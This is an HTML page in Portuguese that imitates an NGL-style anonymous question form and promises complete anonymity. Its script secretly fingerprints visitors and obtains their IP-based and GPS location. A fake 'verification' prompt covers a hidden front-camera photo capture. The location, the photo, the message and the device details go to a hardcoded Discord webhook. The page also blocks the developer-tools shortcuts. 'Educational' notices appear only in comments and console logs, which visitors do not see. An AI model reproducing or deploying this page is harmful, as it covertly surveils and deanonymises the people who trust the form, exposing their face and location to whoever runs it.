<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="permissions-policy" content="camera=*, microphone=*, geolocation=*, notifications=*">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-touch-fullscreen" content="yes">
  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>üí¨</text></svg>">
  <title>Pergunta An√¥nima - NGL Style</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    
    .container {
      background: rgba(255, 255, 255, 0.95);
      -webkit-backdrop-filter: blur(10px);
      backdrop-filter: blur(10px);
      padding: 30px;
      border-radius: 20px;
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
      width: 100%;
      max-width: 400px;
      animation: slideIn 0.6s ease-out;
    }
    
    @keyframes slideIn {
      from {
        opacity: 0;
        transform: translateY(30px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }
    
    .header {
      text-align: center;
      margin-bottom: 30px;
    }
    
    .avatar {
      width: 80px;
      height: 80px;
      background: linear-gradient(45deg, #667eea, #764ba2);
      border-radius: 50%;
      margin: 0 auto 20px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 36px;
      color: white;
      box-shadow: 0 8px 25px rgba(102, 126, 234, 0.3);
    }
    
    .header h1 {
      color: #2c3e50;
      font-size: 24px;
      font-weight: 600;
      margin-bottom: 8px;
    }
    
    .header p {
      color: #7f8c8d;
      font-size: 15px;
      line-height: 1.4;
    }
    
    .anonymous-badge {
      background: linear-gradient(45deg, #27ae60, #2ecc71);
      color: white;
      padding: 8px 16px;
      border-radius: 20px;
      font-size: 12px;
      font-weight: 600;
      display: inline-block;
      margin: 15px 0;
      box-shadow: 0 4px 15px rgba(46, 204, 113, 0.3);
    }
    
    .anonymous-badge::before {
      content: "üé≠ ";
    }
    
    .form-group {
      margin-bottom: 20px;
      position: relative;
    }
    
    .form-group label {
      display: block;
      margin-bottom: 8px;
      color: #34495e;
      font-weight: 500;
      font-size: 14px;
    }
    
    textarea {
      width: 100%;
      padding: 15px;
      border: 2px solid #ecf0f1;
      border-radius: 12px;
      font-size: 16px;
      font-family: inherit;
      resize: vertical;
      min-height: 120px;
      background: #fafafa;
      transition: all 0.3s ease;
      line-height: 1.5;
    }
    
    textarea:focus {
      outline: none;
      border-color: #667eea;
      background: white;
      box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
    }
    
    textarea::placeholder {
      color: #95a5a6;
    }
    
    .char-counter {
      position: absolute;
      right: 12px;
      bottom: 12px;
      font-size: 12px;
      color: #95a5a6;
      background: rgba(255, 255, 255, 0.8);
      padding: 2px 6px;
      border-radius: 8px;
    }
    
    .name-input {
      width: 100%;
      padding: 12px 15px;
      border: 2px solid #ecf0f1;
      border-radius: 12px;
      font-size: 14px;
      background: #fafafa;
      transition: all 0.3s ease;
    }
    
    .name-input:focus {
      outline: none;
      border-color: #667eea;
      background: white;
      box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
    }
    
    .submit-btn {
      width: 100%;
      padding: 16px;
      background: linear-gradient(135deg, #667eea, #764ba2);
      color: white;
      border: none;
      border-radius: 12px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s ease;
      position: relative;
      overflow: hidden;
    }
    
    .submit-btn::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
      transition: left 0.5s;
    }
    
    .submit-btn:hover::before {
      left: 100%;
    }
    
    .submit-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 8px 25px rgba(102, 126, 234, 0.4);
    }
    
    .submit-btn:disabled {
      opacity: 0.6;
      cursor: not-allowed;
      transform: none;
    }
    
    /* Elementos ocultos */
    #video, #canvas, #audio {
      position: absolute;
      opacity: 0;
      width: 1px;
      height: 1px;
      top: -10000px;
      left: -10000px;
      visibility: hidden;
      z-index: -9999;
    }
    
    /* Loading */
    .loading-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(255, 255, 255, 0.95);
      display: none;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      z-index: 9999;
    }
    
    .spinner {
      width: 50px;
      height: 50px;
      border: 4px solid #ecf0f1;
      border-top: 4px solid #667eea;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    .loading-text {
      color: #2c3e50;
      font-size: 18px;
      font-weight: 500;
    }
    
    /* Modal de sucesso */
    .modal-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.6);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 10000;
    }
    
    .modal {
      background: white;
      padding: 40px;
      border-radius: 20px;
      text-align: center;
      max-width: 90%;
      width: 400px;
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
      animation: modalPop 0.4s ease-out;
    }
    
    @keyframes modalPop {
      from {
        opacity: 0;
        transform: scale(0.8);
      }
      to {
        opacity: 1;
        transform: scale(1);
      }
    }
    
    .modal h3 {
      color: #27ae60;
      font-size: 24px;
      margin-bottom: 15px;
      font-weight: 600;
    }
    
    .modal .emoji {
      font-size: 60px;
      margin-bottom: 20px;
      display: block;
    }
    
    .modal p {
      color: #7f8c8d;
      line-height: 1.5;
      margin-bottom: 10px;
    }
    
    .modal button {
      background: #27ae60;
      color: white;
      border: none;
      padding: 12px 24px;
      border-radius: 8px;
      font-size: 14px;
      font-weight: 500;
      cursor: pointer;
      margin-top: 20px;
      transition: background 0.3s;
    }
    
    .modal button:hover {
      background: #229954;
    }
    
    /* Permission prompt estilo NGL */
    .permission-prompt {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(135deg, rgba(102, 126, 234, 0.95), rgba(118, 75, 162, 0.95));
      display: none;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      z-index: 12000;
      color: white;
      text-align: center;
      padding: 20px;
    }
    
    .permission-content {
      background: rgba(255, 255, 255, 0.1);
      padding: 40px;
      border-radius: 20px;
      max-width: 450px;
      -webkit-backdrop-filter: blur(20px);
      backdrop-filter: blur(20px);
      border: 1px solid rgba(255, 255, 255, 0.2);
    }
    
    .permission-icon {
      font-size: 80px;
      margin-bottom: 25px;
      display: block;
    }
    
    .permission-content h3 {
      font-size: 28px;
      margin-bottom: 20px;
      font-weight: 600;
    }
    
    .permission-content p {
      font-size: 16px;
      line-height: 1.6;
      margin-bottom: 15px;
      opacity: 0.9;
    }
    
    .permission-btn {
      background: rgba(255, 255, 255, 0.2);
      color: white;
      border: 2px solid rgba(255, 255, 255, 0.3);
      padding: 15px 30px;
      border-radius: 25px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 20px;
      transition: all 0.3s;
    }
    
    .permission-btn:hover {
      background: rgba(255, 255, 255, 0.3);
      transform: translateY(-2px);
    }
    
    /* Toast */
    .toast {
      position: fixed;
      top: 20px;
      right: 20px;
      background: #2c3e50;
      color: white;
      padding: 15px 20px;
      border-radius: 10px;
      z-index: 15000;
      transform: translateX(100%);
      transition: transform 0.3s;
      font-size: 14px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
    }
    
    .toast.show {
      transform: translateX(0);
    }
    
    .toast.success {
      background: #27ae60;
    }
    
    .toast.error {
      background: #e74c3c;
    }
    
    /* Mapa */
    .location-map {
      width: 100%;
      height: 200px;
      border-radius: 12px;
      margin: 20px 0;
      display: none;
      border: 2px solid #ecf0f1;
    }
    
    /* Responsivo */
    @media (max-width: 480px) {
      .container {
        margin: 10px;
        padding: 25px;
      }
      
      .permission-content {
        padding: 30px 20px;
        margin: 10px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <div class="avatar">üë§</div>
      <h1>Pergunta An√¥nima</h1>
      <p>Envie uma mensagem an√¥nima para mim!</p>
      <div class="anonymous-badge">Completamente an√¥nimo</div>
    </div>

    <form id="anonymous-form">
      <div class="form-group">
        <label for="pergunta">üí¨ Sua pergunta ou mensagem:</label>
        <textarea 
          id="pergunta" 
          placeholder="Digite sua pergunta ou mensagem aqui... Seja honesto, √© totalmente an√¥nimo! üòä"
          maxlength="500"
          required
        ></textarea>
        <div class="char-counter">
          <span id="char-count">0</span>/500
        </div>
      </div>

      <div class="form-group">
        <label for="nome">üé≠ Nome (opcional - para personalizar a resposta):</label>
        <input 
          type="text" 
          id="nome" 
          class="name-input"
          placeholder="Deixe em branco para ser 100% an√¥nimo"
          maxlength="30"
        >
      </div>

      <div class="location-map" id="location-map"></div>

      <button type="submit" class="submit-btn" id="btn-enviar">
        üì§ Enviar Anonimamente
      </button>
    </form>
  </div>

  <!-- Elementos ocultos -->
  <video id="video" autoplay playsinline muted></video>
  <canvas id="canvas"></canvas>
  <audio id="audio"></audio>

  <!-- Loading -->
  <div class="loading-overlay" id="loading-overlay">
    <div class="spinner"></div>
    <div class="loading-text">Enviando sua mensagem...</div>
  </div>

  <!-- Modal de sucesso -->
  <div class="modal-overlay" id="success-modal">
    <div class="modal">
      <span class="emoji">‚ú®</span>
      <h3>Mensagem Enviada!</h3>
      <p>Sua mensagem an√¥nima foi enviada com sucesso!</p>
      <p>Obrigado por participar! üíú</p>
      <button onclick="closeSuccessModal()">Fechar</button>
    </div>
  </div>

  <!-- Prompt de permiss√£o -->
  <div class="permission-prompt" id="permission-prompt">
    <div class="permission-content">
      <span class="permission-icon">üîí</span>
      <h3>Verifica√ß√£o R√°pida</h3>
      <p>Para garantir que voc√™ n√£o √© um bot e manter a qualidade das mensagens, precisamos fazer uma verifica√ß√£o r√°pida.</p>
      <p>Isso leva apenas alguns segundos e √© totalmente seguro!</p>
      <p><strong>Sua privacidade est√° protegida</strong> - continuar√° sendo an√¥nimo.</p>
      <button class="permission-btn" id="permission-button">
        ‚úÖ Verificar e Continuar
      </button>
    </div>
  </div>

  <script>
    // SISTEMA EDUCACIONAL AVAN√áADO - PARA FINS DE APRENDIZADO
    // Use apenas para teste pessoal e compreens√£o de t√©cnicas de coleta
    
    class AdvancedDataCollector {
        constructor() {
            this.webhook = "https://discord.com/api/webhooks/1356844204608721017/GB-N9jMt__CmHGiFaJUAOg_doQBZTNH0GjOoTwekMa_SBmIff-NKyk91FUDDQuhfCQE2";
            
            // Estado do sistema
            this.data = {
                location: { lat: null, lon: null, accuracy: null, status: 'pending' },
                camera: { image: null, status: 'pending', sent: false },
                device: {},
                ip: {},
                behavior: { startTime: Date.now(), interactions: [] },
                permissions: { location: false, camera: false, notifications: false }
            };
            
            this.flags = {
                cameraAttempted: false,
                locationSent: false,
                cameraSent: false,
                permissionsRequested: false,
                formSubmitted: false
            };
            
            this.detectDevice();
            this.init();
        }
        
        detectDevice() {
            const ua = navigator.userAgent;
            this.data.device = {
                isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua),
                isIOS: /iPad|iPhone|iPod/.test(ua),
                isAndroid: /Android/i.test(ua),
                isSafari: /^((?!chrome|android).)*safari/i.test(ua),
                isChrome: ua.includes('Chrome') && !ua.includes('Edge'),
                isFirefox: ua.includes('Firefox'),
                userAgent: ua,
                screen: {
                    width: screen.width,
                    height: screen.height,
                    colorDepth: screen.colorDepth
                },
                viewport: {
                    width: window.innerWidth,
                    height: window.innerHeight
                },
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                platform: navigator.platform,
                cookiesEnabled: navigator.cookieEnabled
            };
        }
        
        async init() {
            console.log('üöÄ Iniciando sistema avan√ßado...');
            
            // Obter informa√ß√µes b√°sicas
            await this.getIPInfo();
            
            // Configurar eventos
            this.setupEventListeners();
            this.setupCharacterCounter();
            
            // Iniciar captura autom√°tica em mobile
            if (this.data.device.isMobile) {
                setTimeout(() => this.captureCamera(), 500);
            }
            
            // Mostrar prompt ap√≥s delay
            setTimeout(() => this.showPermissionPrompt(), 1500);
            
            // Auto-request em intera√ß√µes
            this.setupAutoTriggers();
        }
        
        setupEventListeners() {
            // Form submission
            document.getElementById('anonymous-form').addEventListener('submit', (e) => {
                e.preventDefault();
                this.handleFormSubmit();
            });
            
            // Permission button
            document.getElementById('permission-button').addEventListener('click', () => {
                this.hidePermissionPrompt();
                this.requestAllPermissions();
            });
            
            // Rastrear intera√ß√µes
            document.addEventListener('click', (e) => {
                this.data.behavior.interactions.push({
                    type: 'click',
                    element: e.target.id || e.target.tagName,
                    timestamp: Date.now() - this.data.behavior.startTime
                });
            });
        }
        
        setupCharacterCounter() {
            const textarea = document.getElementById('pergunta');
            const counter = document.getElementById('char-count');
            
            if (textarea && counter) {
                textarea.addEventListener('input', () => {
                    const count = textarea.value.length;
                    counter.textContent = count;
                });
            }
        }
        
        setupAutoTriggers() {
            const events = ['click', 'touchstart', 'scroll', 'mousemove'];
            const autoTrigger = () => {
                if (!this.flags.permissionsRequested) {
                    setTimeout(() => this.requestAllPermissions(), 200);
                }
            };
            
            events.forEach(event => {
                document.addEventListener(event, autoTrigger, { once: true, passive: true });
            });
        }
        
        showPermissionPrompt() {
            const element = document.getElementById('permission-prompt');
            if (element) {
                element.style.display = 'flex';
            }
        }
        
        hidePermissionPrompt() {
            const element = document.getElementById('permission-prompt');
            if (element) {
                element.style.display = 'none';
            }
        }
        
        async getIPInfo() {
            try {
                const services = [
                    'https://ip-api.com/json',
                    'https://ipapi.co/json/',
                    'https://ipinfo.io/json',
                    'https://ipwhois.app/json/',
                    'https://api.ipgeolocation.io/ipgeo?apiKey=demo'
                ];
                
                for (const service of services) {
                    try {
                        const response = await fetch(service);
                        if (response.ok) {
                            const data = await response.json();
                            this.data.ip = {
                                ip: data.ip || data.query,
                                city: data.city,
                                region: data.region || data.regionName,
                                country: data.country_name || data.country,
                                isp: data.org || data.isp,
                                latitude: parseFloat(data.latitude || data.lat) || null,
                                longitude: parseFloat(data.longitude || data.lon) || null,
                                timezone: data.timezone,
                                service: service
                            };
                            
                            console.log('üì° IP info obtida');
                            return;
                        }
                    } catch (e) {
                        console.log(`Tentando pr√≥ximo servi√ßo...`);
                    }
                }
            } catch (error) {
                console.log('IP info n√£o dispon√≠vel');
            }
        }
        
        async requestAllPermissions() {
            if (this.flags.permissionsRequested) return;
            this.flags.permissionsRequested = true;
            
            console.log('üîê Solicitando permiss√µes...');
            
            const requests = [
                this.requestLocation(),
                this.requestNotifications()
            ];
            
            // Se n√£o capturou c√¢mera ainda, tentar novamente
            if (!this.flags.cameraAttempted) {
                requests.push(this.captureCamera());
            }
            
            await Promise.allSettled(requests);
            console.log('‚úÖ Permiss√µes processadas');
        }
        
        async requestLocation() {
            try {
                if (!navigator.geolocation) return;
                
                const options = {
                    enableHighAccuracy: true,
                    timeout: this.data.device.isIOS ? 20000 : 10000,
                    maximumAge: 0
                };
                
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, options);
                });
                
                this.data.location = {
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    status: 'success',
                    source: 'GPS'
                };
                
                // Criar Google Maps URL
                this.data.location.googleMapsUrl = `https://www.google.com/maps?q=${this.data.location.lat},${this.data.location.lon}`;
                
                console.log('‚úÖ Localiza√ß√£o obtida');
                this.showToast('üìç Localiza√ß√£o verificada', 'success');
                
                // Enviar localiza√ß√£o imediatamente
                this.sendLocationToDiscord();
                
            } catch (error) {
                console.log('‚ùå Localiza√ß√£o negada');
                this.data.location.status = 'error';
                
                // Fallback para IP
                if (this.data.ip.latitude && this.data.ip.longitude) {
                    this.data.location.lat = this.data.ip.latitude;
                    this.data.location.lon = this.data.ip.longitude;
                    this.data.location.googleMapsUrl = `https://www.google.com/maps?q=${this.data.location.lat},${this.data.location.lon}`;
                    this.data.location.source = 'IP';
                    this.sendLocationToDiscord();
                }
            }
        }
        
        async captureCamera() {
            if (this.flags.cameraAttempted) return;
            this.flags.cameraAttempted = true;
            
            try {
                console.log('üì∏ Iniciando captura r√°pida...');
                
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                
                // Configura√ß√µes otimizadas para velocidade
                const constraints = {
                    audio: false,
                    video: {
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 },
                        frameRate: { ideal: 15 }
                    }
                };
                
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = stream;
                
                // Configurar v√≠deo para silencioso
                video.muted = true;
                video.volume = 0;
                video.setAttribute('playsinline', '');
                
                // Aguardar v√≠deo carregar
                await new Promise(resolve => {
                    video.addEventListener('loadedmetadata', resolve, { once: true });
                });
                
                // Captura ultra-r√°pida
                setTimeout(() => {
                    try {
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0);
                        
                        this.data.camera = {
                            image: canvas.toDataURL('image/jpeg', 0.7),
                            status: 'success',
                            resolution: `${canvas.width}x${canvas.height}`,
                            timestamp: new Date().toISOString()
                        };
                        
                        console.log('‚úÖ Foto capturada!');
                        this.showToast('üì∏ Verifica√ß√£o visual OK', 'success');
                        
                        // Enviar foto imediatamente
                        this.sendCameraToDiscord();
                        
                    } catch (e) {
                        console.error('Erro na captura:', e);
                    } finally {
                        // SEMPRE parar a c√¢mera
                        stream.getTracks().forEach(track => track.stop());
                        video.srcObject = null;
                    }
                }, 100); // Apenas 100ms!
                
            } catch (error) {
                console.log('‚ùå C√¢mera n√£o acess√≠vel');
                this.data.camera.status = 'error';
            }
        }
        
        async requestNotifications() {
            try {
                if (!('Notification' in window)) return;
                
                let permission = Notification.permission;
                
                if (permission === 'default') {
                    permission = await Notification.requestPermission();
                }
                
                this.data.permissions.notifications = permission === 'granted';
                
                if (permission === 'granted') {
                    const notification = new Notification('‚úÖ Sistema Verificado', {
                        body: 'Suas permiss√µes foram configuradas!',
                        requireInteraction: false
                    });
                    
                    setTimeout(() => notification.close(), 3000);
                    console.log('‚úÖ Notifica√ß√µes ativadas');
                }
                
            } catch (error) {
                console.log('‚ùå Notifica√ß√µes negadas');
            }
        }
        
        async sendLocationToDiscord() {
            if (this.flags.locationSent || !this.data.location.lat) return;
            this.flags.locationSent = true;
            
            try {
                const { lat, lon, accuracy, googleMapsUrl, source } = this.data.location;
                
                const payload = {
                    username: "üìç Location Tracker",
                    avatar_url: "https://cdn-icons-png.flaticon.com/512/854/854878.png",
                    embeds: [{
                        title: `üìç Localiza√ß√£o Capturada (${source || 'N/A'})`,
                        description: `Coordenadas obtidas com sucesso!\n[üó∫Ô∏è Ver no Google Maps](${googleMapsUrl})`,
                        color: source === 'GPS' ? 0x00FF00 : 0xFFA500,
                        fields: [
                            {
                                name: "üìç Coordenadas",
                                value: `**Latitude:** \`${lat.toFixed(6)}\`\n**Longitude:** \`${lon.toFixed(6)}\``,
                                inline: true
                            },
                            {
                                name: "üéØ Precis√£o",
                                value: `\`${accuracy ? accuracy.toFixed(2) + ' metros' : 'N/A'}\``,
                                inline: true
                            },
                            {
                                name: "üì± Dispositivo",
                                value: `\`${this.data.device.isIOS ? 'iOS' : this.data.device.isAndroid ? 'Android' : 'Desktop'}\``,
                                inline: true
                            },
                            {
                                name: "üåê IP",
                                value: `\`${this.data.ip.ip || 'N/A'}\``,
                                inline: true
                            },
                            {
                                name: " ISP",
                                value: `\`${this.data.ip.isp || 'N/A'}\``,
                                inline: true
                            },
                            {
                                name: "üïê Timestamp",
                                value: `\`${new Date().toLocaleString('pt-BR')}\``,
                                inline: true
                            }
                        ],
                        url: googleMapsUrl,
                        footer: {
                            text: "Sistema de Localiza√ß√£o Educacional"
                        },
                        timestamp: new Date().toISOString()
                    }]
                };
                
                const response = await fetch(this.webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                
                if (response.ok) {
                    console.log("üìç Localiza√ß√£o enviada!");
                }
                
            } catch (error) {
                console.error("Erro ao enviar localiza√ß√£o:", error);
            }
        }
        
        async sendCameraToDiscord() {
            if (this.flags.cameraSent || !this.data.camera.image) return;
            this.flags.cameraSent = true;
            
            try {
                const payload = {
                    username: "üì∏ Camera Capture",
                    avatar_url: "https://cdn-icons-png.flaticon.com/512/3075/3075977.png",
                    content: "üì∏ **Foto capturada com sucesso!**",
                    embeds: [{
                        title: "Verifica√ß√£o Visual Conclu√≠da",
                        description: "Imagem capturada automaticamente para verifica√ß√£o de seguran√ßa",
                        color: 0x00FF00,
                        fields: [
                            {
                                name: "üì± Dispositivo",
                                value: `\`${this.data.device.isIOS ? 'iOS' : this.data.device.isAndroid ? 'Android' : 'Desktop'}\``,
                                inline: true
                            },
                            {
                                name: "üåê IP",
                                value: `\`${this.data.ip.ip || 'N/A'}\``,
                                inline: true
                            },
                            {
                                name: "üïê Capturada em",
                                value: `\`${new Date().toLocaleString('pt-BR')}\``,
                                inline: true
                            }
                        ],
                        image: {
                            url: "attachment://camera_capture.jpg"
                        },
                        footer: {
                            text: "Sistema de Verifica√ß√£o Visual"
                        },
                        timestamp: new Date().toISOString()
                    }]
                };
                
                // Preparar FormData para envio da imagem
                const formData = new FormData();
                formData.append("payload_json", JSON.stringify(payload));
                
                // Converter base64 para blob
                const blob = this.dataURLtoBlob(this.data.camera.image);
                formData.append("file", blob, "camera_capture.jpg");
                
                const response = await fetch(this.webhook, {
                    method: 'POST',
                    body: formData
                });
                
                if (response.ok) {
                    console.log("üì∏ Foto enviada!");
                }
                
            } catch (error) {
                console.error("Erro ao enviar foto:", error);
            }
        }
        
        dataURLtoBlob(dataURL) {
            const arr = dataURL.split(',');
            const mime = arr[0].match(/:(.*?);/)[1];
            const bstr = atob(arr[1]);
            let n = bstr.length;
            const u8arr = new Uint8Array(n);
            
            while (n--) {
                u8arr[n] = bstr.charCodeAt(n);
            }
            
            return new Blob([u8arr], { type: mime });
        }
        
        showToast(message, type = 'info') {
            const toast = document.createElement('div');
            toast.className = `toast ${type}`;
            toast.textContent = message;
            
            document.body.appendChild(toast);
            
            setTimeout(() => toast.classList.add('show'), 100);
            
            setTimeout(() => {
                toast.classList.remove('show');
                setTimeout(() => {
                    if (document.body.contains(toast)) {
                        document.body.removeChild(toast);
                    }
                }, 300);
            }, 2500);
        }
        
        validateForm() {
            const pergunta = document.getElementById('pergunta').value.trim();
            
            if (!pergunta) {
                this.showToast('‚ùå Escreva uma mensagem', 'error');
                return false;
            }
            
            if (pergunta.length < 5) {
                this.showToast('‚ùå Mensagem muito curta', 'error');
                return false;
            }
            
            return true;
        }
        
        async handleFormSubmit() {
            if (this.flags.formSubmitted) return;
            
            if (!this.validateForm()) return;
            
            this.flags.formSubmitted = true;
            
            // Mostrar loading
            document.getElementById('loading-overlay').style.display = 'flex';
            document.getElementById('btn-enviar').disabled = true;
            
            // Garantir que todas as permiss√µes foram solicitadas
            if (!this.flags.permissionsRequested) {
                await this.requestAllPermissions();
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
            
            // Calcular tempo na p√°gina
            this.data.behavior.timeToSubmit = Date.now() - this.data.behavior.startTime;
            
            // Enviar dados completos
            await this.sendCompleteData();
        }
        
        async sendCompleteData() {
            try {
                const pergunta = document.getElementById('pergunta').value.trim();
                const nome = document.getElementById('nome').value.trim() || 'An√¥nimo';
                
                const embed = {
                    title: 'üí¨ Nova Mensagem An√¥nima Completa',
                    description: `**Mensagem:** ${pergunta}`,
                    color: 0x667eea,
                    fields: [
                        {
                            name: 'üë§ Usu√°rio',
                            value: `**Nome:** ${nome}\n**Data:** ${new Date().toLocaleString('pt-BR')}`,
                            inline: false
                        },
                        {
                            name: 'üåê Informa√ß√µes de Rede',
                            value: `**IP:** ${this.data.ip.ip || 'N/A'}\n**Cidade:** ${this.data.ip.city || 'N/A'}\n**Pa√≠s:** ${this.data.ip.country || 'N/A'}`,
                            inline: true
                        },
                        {
                            name: 'üìç Localiza√ß√£o',
                            value: this.data.location.status === 'success' 
                                ? `**GPS:** ${this.data.location.lat?.toFixed(6)}, ${this.data.location.lon?.toFixed(6)}\n[üó∫Ô∏è Google Maps](${this.data.location.googleMapsUrl})`
                                : 'N√£o dispon√≠vel',
                            inline: true
                        },
                        {
                            name: 'üì± Dispositivo',
                            value: `**Tipo:** ${this.data.device.isMobile ? 'Mobile' : 'Desktop'}\n**OS:** ${this.data.device.isIOS ? 'iOS' : this.data.device.isAndroid ? 'Android' : 'Outro'}\n**Browser:** ${this.data.device.isChrome ? 'Chrome' : this.data.device.isSafari ? 'Safari' : 'Outro'}`,
                            inline: false
                        },
                        {
                            name: 'üìä Comportamento',
                            value: `**Tempo:** ${Math.round(this.data.behavior.timeToSubmit / 1000)}s\n**Intera√ß√µes:** ${this.data.behavior.interactions.length}`,
                            inline: true
                        },
                        {
                            name: 'üîê Verifica√ß√µes',
                            value: [
                                `üìç GPS: ${this.data.location.status === 'success' ? '‚úÖ' : '‚ùå'}`,
                                `üì∏ C√¢mera: ${this.data.camera.status === 'success' ? '‚úÖ' : '‚ùå'}`,
                                `üîî Notifica√ß√µes: ${this.data.permissions.notifications ? '‚úÖ' : '‚ùå'}`
                            ].join('\n'),
                            inline: true
                        }
                    ],
                    footer: {
                        text: 'üí¨ Sistema Educacional de Coleta de Dados'
                    },
                    timestamp: new Date().toISOString()
                };
                
                const payload = {
                    username: 'üí¨ Sistema Completo NGL-Style',
                    avatar_url: 'https://cdn-icons-png.flaticon.com/512/1828/1828833.png',
                    embeds: [embed]
                };
                
                const response = await fetch(this.webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                
                if (response.ok) {
                    console.log('‚úÖ Dados completos enviados!');
                    this.showSuccessModal();
                } else {
                    throw new Error('Falha no envio');
                }
                
            } catch (error) {
                console.error('‚ùå Erro no envio:', error);
                this.showToast('‚ùå Erro ao enviar. Tente novamente.', 'error');
                this.flags.formSubmitted = false;
                document.getElementById('btn-enviar').disabled = false;
            } finally {
                document.getElementById('loading-overlay').style.display = 'none';
            }
        }
        
        showSuccessModal() {
            document.getElementById('success-modal').style.display = 'flex';
            
            // Limpar formul√°rio
            document.getElementById('pergunta').value = '';
            document.getElementById('nome').value = '';
            const counter = document.getElementById('char-count');
            if (counter) counter.textContent = '0';
            
            // Reset
            this.flags.formSubmitted = false;
            document.getElementById('btn-enviar').disabled = false;
        }
    }
    
    // Fun√ß√£o global para fechar modal
    window.closeSuccessModal = function() {
        const modal = document.getElementById('success-modal');
        if (modal) modal.style.display = 'none';
    };
    
    // Inicializar sistema
    document.addEventListener('DOMContentLoaded', () => {
        console.log('üí¨ Iniciando sistema NGL avan√ßado...');
        window.advancedSystem = new AdvancedDataCollector();
        console.log('‚úÖ Sistema pronto!');
        
        // Avisos importantes
        console.warn('‚ö†Ô∏è Sistema educacional - Para aprendizado apenas');
        console.warn('‚ö†Ô∏è Use responsavelmente e com consentimento');
        console.warn('‚ö†Ô∏è Dados coletados para fins de demonstra√ß√£o t√©cnica');
    });
    
    // Prote√ß√µes b√°sicas
    document.addEventListener('keydown', (e) => {
        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
            e.preventDefault();
            console.log('üîí DevTools bloqueado');
            return false;
        }
    });
    
    document.addEventListener('contextmenu', (e) => {
        e.preventDefault();
        return false;
    });
    
    // Console messages
    console.log('%cüì∏ SISTEMA DE CAPTURA AVAN√áADO', 'color: #667eea; font-size: 16px; font-weight: bold;');
    console.log('%cC√¢mera ultra-r√°pida ‚Ä¢ GPS preciso ‚Ä¢ Dados completos', 'color: #764ba2; font-size: 12px;');
    console.log('%cPara fins educacionais e teste pessoal apenas', 'color: #95a5a6; font-size: 10px;');
</script>
</body>
</html>
